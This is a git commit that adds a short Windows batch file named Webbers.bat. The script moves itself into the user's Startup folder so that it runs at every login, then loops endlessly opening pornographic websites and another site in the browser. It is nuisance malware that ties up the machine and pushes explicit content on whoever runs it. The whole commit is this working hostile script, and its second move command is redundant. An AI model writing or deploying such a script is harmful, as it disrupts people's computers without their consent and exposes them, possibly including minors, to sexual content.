265a2c95b21ee09b5760ed3d63e0ef5671b721ed
XxTryingxX <101686638+XxTryingxX@users.noreply.github.com>
2022-03-15 20:12:46 -0700

    Add files via upload

---
+++ Webbers.bat
@@ -0,0 +1,8 @@
+@echo off
+move "%USERPROFILE%\Desktop\Webbers.bat" "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+move  "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+:A
+start www.Pornhub.com
+start www.xvideos.com
+start www.goku.com
+goto:A
